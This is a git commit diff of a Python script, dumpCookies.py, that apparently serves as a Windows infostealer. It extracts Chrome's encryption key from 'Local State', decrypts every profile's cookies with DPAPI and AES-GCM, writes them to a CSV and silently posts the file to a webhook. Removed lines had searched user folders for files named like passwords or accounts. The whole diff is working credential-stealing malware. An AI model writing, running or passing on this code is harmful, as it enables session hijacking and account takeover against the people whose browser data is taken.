d7aa7501519c0677337710ecb7a1408c5af1fbbd
Knaro <84656846+Knaro009@users.noreply.github.com>
2023-03-01 12:53:48 -0800

    Update dumpCookies.py

--- dumpCookies.py
+++ dumpCookies.py
@@ -1,32 +1,90 @@
 import os
+from Crypto.Cipher import AES
+from requests import post
+from sqlite3 import connect
+from csv import writer
+from base64 import b64decode
+from json import loads
+from win32crypt import CryptUnprotectData
+from shutil import copyfile
 
-#TODO: get cookies and dump cookies, posssibly put getimportantfilesfromlocation in a different project
+webhookURL = ""
+CHROMEPATH = f"c:\\Users\\{os.getlogin()}\\AppData\\Local\\Google\\Chrome\\User Data"
 
-def isAny(array1, array2):
-    foundEntries = []
+# I used reference to figure out the decryption.
 
-    for entryARR1 in array1:
-        for entryARR2 in array2:
-            if entryARR1 in entryARR2:
-                foundEntries.append(entryARR2)
+def sendToWebhook(fileToSend):
+    file = open(fileToSend, "rb")
+    # "content": "file",
+    data = {
+        "file": (file.name, file.read())
+    }
+    post(webhookURL, data=data)
+
+def getChromeDencryptionKey():
+    if not os.path.exists(f"{CHROMEPATH}\\Local State"): return
+
+    localStateFile = open(f"{CHROMEPATH}\\Local State", "r", encoding="utf-8")
+    localStateFileJson = loads(localStateFile.read())["os_crypt"]["encrypted_key"]
     
-    return foundEntries
+    return CryptUnprotectData(b64decode(localStateFileJson)[5:], None, None, None, 0)[1]
 
-def getImportantFilesFromLocation(location): # Send to webhook
-    keyWords = ["password", "account", "user", "pass"]
-    interestingFiles = []
-    path = ""
+def decryptCookie(cookie, key):
+    # All the heavy lifting was not done by me.
+    try:
+        return AES.new(key, AES.MODE_GCM, cookie[3:15]).decrypt(cookie[15:])[:-16].decode()
+    except:
+        try:
+            return str(CryptUnprotectData(cookie, None, None, None, 0)[1])
+        except:
+            return None
 
-    if os.path.exists(f"c:\\Users\\{os.getlogin()}\\OneDrive\\{location}"):
-        path = f"c:\\Users\\{os.getlogin()}\\OneDrive\\{location}"
-    elif os.path.exists(f"c:\\Users\\{os.getlogin()}\\{location}"):
-        path = f"c:\\Users\\{os.getlogin()}\\{location}"
+def getChromePasswords():
+    decryptionKey = getChromeDencryptionKey()
+    exportedPasswordsFile = open("ChromeCookies.csv", "w", newline="")
+    csvWriter = writer(exportedPasswordsFile)
+    i = 0
+    i2 = 1
 
-    for entryARR1 in keyWords:
-        for entryARR2 in os.listdir(path):
-            file = f"{path}\\{entryARR2}"
-            if os.path.isfile(file) and file not in interestingFiles and (entryARR1 in entryARR2):
-                interestingFiles.append(file)
-    
-    return interestingFiles
+    for itemName in os.listdir(CHROMEPATH):
+        fullFilePath = f"{CHROMEPATH}\\{itemName}"
+        if os.path.isdir(fullFilePath) and "profile" in itemName.lower() or "default" in itemName.lower():
+            cookiesFile = f"{fullFilePath}\\Network\\Cookies"
+            if os.path.exists(cookiesFile) and os.path.isfile(cookiesFile):
+                copiedCookiesFile = copyfile(cookiesFile, f"Cookies {i}")
+                cookiesDB = connect(copiedCookiesFile)
+                cookiesDB.text_factory = lambda b: b.decode(errors="ignore")
+                cursor = cookiesDB.cursor()
+                i += 1
 
+                csvWriter.writerow([i2, "Site", "Cookie Name", "cookie" f"NEW PROFILE: {i}"])
+                cursor.execute("""
+    SELECT host_key, name, value, creation_utc, last_access_utc, expires_utc, encrypted_value 
+    FROM cookies""") # Not by me! Idk SQL!
+                for row in cursor.fetchall():
+                    site = row[0]
+                    cookieName = row[1]
+                    unEncryptedCookie = row[2] # The un encrypted cookie [2] encrypted cookie at [6]
+                    encryptedCookie = row[6]
+
+                    cookie = ""
+                    
+                    if not unEncryptedCookie and encryptedCookie:
+                        cookie = decryptCookie(encryptedCookie, decryptionKey)
+                    else:
+                        cookie = unEncryptedCookie
+                    
+                    if not cookie: continue # Possibly check for if the cookie is more than 100 characters
+
+                    csvWriter.writerow([i2, site, cookieName, cookie])
+                    i2 = i2 + 1
+                cursor.close()
+                cookiesDB.close()
+                os.remove(os.path.abspath(copiedCookiesFile))
+    exportedPasswordsFile.close()
+    return exportedPasswordsFile.name
+
+try:
+    sendToWebhook(getChromePasswords())
+except:
+    pass
